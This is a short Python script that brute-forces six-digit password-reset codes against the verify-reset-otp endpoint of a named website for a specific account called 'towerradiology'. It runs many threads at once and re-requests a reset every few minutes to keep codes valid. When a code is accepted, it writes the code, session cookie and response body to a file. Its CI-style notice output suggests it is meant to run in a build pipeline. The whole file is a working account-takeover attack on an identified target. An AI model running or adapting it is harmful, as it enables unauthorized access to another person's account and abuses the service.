import json, os, random, sys, threading, time
import requests
URL='https://youraifrontdesk.com/api/auth/verify-reset-otp'
UID=os.environ['UID']; START=int(os.environ['START']); END=int(os.environ['END']); W=int(os.environ.get('WORKERS','120'))
STOP=threading.Event(); L=threading.Lock(); S={'next':START,'tried':0}
def w():
    s=requests.Session()
    while not STOP.is_set():
        with L:
            if S['next']>END: STOP.set(); return
            c=S['next']; S['next']+=1
        try: r=s.post(URL,json={'user_id':UID,'otp_code':f'{c:06d}'},timeout=20)
        except Exception: continue
        with L: S['tried']+=1
        if r.status_code==200:
            STOP.set(); open('HIT.txt','w').write(f'otp={c:06d}\ncookie={r.headers.get("set-cookie")}\nbody={r.text}\n')
            print('::notice title=HIT::otp '+f'{c:06d}'); return
        if S['tried']%5000==0: print('tried',S['tried'],'next',S['next'],flush=True)
def refresh():
    while not STOP.wait(240):
        try:
            r=requests.post('https://youraifrontdesk.com/api/auth/reset-password',json={'username_or_Email':'towerradiology'},timeout=20)
            print('refresh',r.status_code,flush=True)
        except Exception as e: print('refresh err',type(e).__name__,flush=True)
print('start',START,END,W,flush=True)
threading.Thread(target=refresh,daemon=True).start()
ts=[threading.Thread(target=w,daemon=True) for _ in range(W)]
[t.start() for t in ts]
while any(t.is_alive() for t in ts) and not STOP.is_set(): time.sleep(2)
print('done tried',S['tried'],'next',S['next'],flush=True)
